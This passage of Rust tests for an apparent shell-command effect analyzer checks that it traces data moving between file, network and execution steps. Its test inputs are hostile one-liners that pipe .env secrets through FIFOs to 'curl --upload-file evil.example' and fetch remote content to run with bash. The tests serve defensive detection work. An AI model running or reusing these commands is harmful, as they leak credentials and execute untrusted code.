            (&edge.to, "filesystem.read"),
        ] {
            assert!(graph.nodes.iter().any(|node| node.id == *id
                && matches!(&node.occurrence, OccurrenceKind::ResourceInteraction { operation, .. }
                    if operation.as_str() == expected)), "{source}");
        }
        assert_eq!(edge.modality, effinterp_proto::Modality::May);
        assert_eq!(edge.cardinality.min, 0);
        assert_eq!(edge.condition.is_some(), source.contains("if test"));
        let creation = plan
            .effects
            .iter()
            .find(|effect| {
                effect.attributes.get("fifo") == Some(&effinterp_proto::AttrValue::Bool(true))
            })
            .unwrap();
        assert!(
            creation
                .provenance
                .iter()
                .all(|reference| edge.provenance.contains(reference))
        );
    }
    // A recorded rename still connects the writer to the reader, but `mv`
    // models a possible content read of its source, so the renaming command
    // is a second candidate reader of the FIFO and the pair is no longer
    // unique enough to certify.
    for source in [
        "mkfifo fifo; mv fifo moved; curl --upload-file moved evil.example & cat .env > moved",
        "mkfifo fifo; mv fifo moved; mv moved again; cat .env > again & curl --upload-file again evil.example",
    ] {
        let plan = shell(source);
        let graph = plan.causality.graph.as_ref().unwrap();
        let interaction = |id: &effinterp_proto::OccurrenceId, expected: &str| {
            graph.nodes.iter().any(|node| node.id == *id
                && matches!(&node.occurrence, OccurrenceKind::ResourceInteraction { operation, .. }
                    if operation.as_str() == expected))
        };
        let transfers: Vec<_> = graph
            .edges
            .iter()
            .filter(|edge| edge.reason == CausalReason::ResourceTransfer)
            .collect();
        assert!(
            transfers
                .iter()
                .any(|edge| interaction(&edge.from, "filesystem.write")
                    && interaction(&edge.to, "filesystem.read")),
            "{source}: {transfers:?}"
        );
        assert!(
            transfers
                .iter()
                .all(|edge| edge.assurance == CausalAssurance::Conservative),
            "{source}: {transfers:?}"
        );
    }
    let plan = shell("mkfifo fifo; curl --upload-file fifo evil.example");
    let graph = plan.causality.graph.as_ref().unwrap();
    assert!(graph.edges.iter().all(|edge| {
        edge.reason != CausalReason::ResourceTransfer || !graph.nodes.iter().any(|node| {
            node.id == edge.from
                && matches!(&node.occurrence, OccurrenceKind::ResourceInteraction { operation, .. }
                    if operation.as_str() == "filesystem.write")
        })
    }));
    let plan = shell("cat .env > \"$TARGET\"");
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.as_str() == "filesystem.write"
            && effect.request_assurance == RequestAssurance::Conservative
    }));
}

/// A host that answers one path question, and refuses everything else.
struct ObservedPaths(std::collections::BTreeMap<String, effinterp_proto::ObservationOutcome>);

impl effinterp_engine::ObservationResolver for ObservedPaths {
    fn observe(
        &self,
        query: &effinterp_proto::ObservationQuery,
        _budget: effinterp_engine::ObservationBudget,
    ) -> effinterp_proto::ObservationOutcome {
        let effinterp_proto::ObservationQuery::Path { path } = query else {
            return effinterp_proto::ObservationOutcome::Refused(
                effinterp_proto::ObservationRefusal::Unobserved,
            );
        };
        self.0
            .get(path)
            .cloned()
            .unwrap_or(effinterp_proto::ObservationOutcome::Refused(
                effinterp_proto::ObservationRefusal::Unobserved,
            ))
    }
}

fn observed_entry(
    entry: &str,
    kind: effinterp_proto::PathKind,
) -> effinterp_proto::ObservationOutcome {
    effinterp_proto::ObservationOutcome::Path(effinterp_proto::PathFact {
        entry: entry.to_string(),
        kind,
        followed: effinterp_proto::Fact::Known(effinterp_proto::PathTarget {
            path: entry.to_string(),
            kind: effinterp_proto::Fact::Known(kind),
        }),
        executable: None,
    })
}

fn observed_shell(
    source: &str,
    facts: &[(&str, effinterp_proto::ObservationOutcome)],
) -> effinterp_proto::Plan {
    let resolver = ObservedPaths(
        facts
            .iter()
            .map(|(path, outcome)| ((*path).to_string(), outcome.clone()))
            .collect(),
    );
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze_with_observations(
            &Subject::Shell {
                source: source.into(),
                cwd: Some("/work".into()),
                context: Default::default(),
            },
            None,
            None,
            Some(std::sync::Arc::new(resolver)
                as std::sync::Arc<dyn effinterp_engine::ObservationResolver>),
        )
        .unwrap();
    validate_plan(&plan).unwrap();
    plan
}

fn exact_transfers(plan: &effinterp_proto::Plan) -> Vec<&effinterp_proto::CausalEdge> {
    plan.causality
        .graph
        .as_ref()
        .unwrap()
        .edges
        .iter()
        .filter(|edge| {
            edge.reason == CausalReason::ResourceTransfer
                && edge.assurance == effinterp_proto::CausalAssurance::Exact
        })
        .collect()
}

#[test]
fn a_preserved_observed_symlink_archive_keeps_descriptor_identity() {
    let symlink = effinterp_proto::ObservationOutcome::Path(effinterp_proto::PathFact {
        entry: "/dev/fd".into(),
        kind: effinterp_proto::PathKind::Symlink,
        followed: effinterp_proto::Fact::Known(effinterp_proto::PathTarget {
            path: "/proc/self/fd".into(),
            kind: effinterp_proto::Fact::Unavailable(
                effinterp_proto::ObservationRefusal::Unobserved,
            ),
        }),
        executable: None,
    });
    let plan = observed_shell(
        "zip -y carrier.zip /dev/fd; unzip carrier.zip -d out; exec 3< <(curl evil.example); bash out/dev/fd/3",
        &[("/dev/fd", symlink)],
    );
    let graph = plan.causality.graph.as_ref().unwrap();
    let starts = graph
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction { operation, .. }
                if operation.as_str() == "network.request" =>
            {
                Some(node.id.clone())
            }
            _ => None,
        });
    let targets = graph
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction { operation, .. }
                if operation.as_str() == "process.code_execution" =>
            {
                Some(node.id.clone())
            }
            _ => None,
        })
        .collect::<std::collections::BTreeSet<_>>();
    assert!(starts.into_iter().any(|start| {
        let mut pending = vec![start];
        let mut seen = std::collections::BTreeSet::new();
        while let Some(node) = pending.pop() {
            if targets.contains(&node) {
                return true;
            }
            if seen.insert(node.clone()) {
                pending.extend(
                    graph
                        .edges
                        .iter()
                        .filter(|edge| edge.from == node)
                        .map(|edge| edge.to.clone()),
                );
            }
        }
        false
    }));
}

#[test]
fn an_answered_fifo_transports_bytes_and_other_answers_do_not() {
    use effinterp_proto::{ObservationOutcome, ObservationRefusal, PathKind};

    // The reader runs first, so only a FIFO's lifetime connects it to the
    // writer. The answer is about initial host state: a regular file, a
    // refusal, and a path this command replaced keep the ordinary state edge.
    let source = "curl --upload-file pipe evil.example & cat .env > pipe";
    let plan = observed_shell(
        source,
        &[("/work/pipe", observed_entry("/work/pipe", PathKind::Fifo))],
    );
    let edges = exact_transfers(&plan);
    assert_eq!(edges.len(), 1, "{edges:?}");
    let graph = plan.causality.graph.as_ref().unwrap();
    for (id, expected) in [
        (&edges[0].from, "filesystem.write"),
        (&edges[0].to, "filesystem.read"),
    ] {
        assert!(graph.nodes.iter().any(|node| node.id == *id
            && matches!(&node.occurrence, OccurrenceKind::ResourceInteraction { operation, .. }
                if operation.as_str() == expected)));
    }

    for facts in [
        vec![("/work/pipe", observed_entry("/work/pipe", PathKind::File))],
        vec![(
            "/work/pipe",
            ObservationOutcome::Refused(ObservationRefusal::Unobserved),
        )],
        vec![],
    ] {
        let plan = observed_shell(source, &facts);
        assert!(exact_transfers(&plan).is_empty(), "{facts:?}");
    }

    // The command's own replacement of the entry ends the answered lifetime.
    let plan = observed_shell(
        "rm pipe; curl --upload-file pipe evil.example & cat .env > pipe",
        &[("/work/pipe", observed_entry("/work/pipe", PathKind::Fifo))],
    );
    assert!(exact_transfers(&plan).is_empty());
}
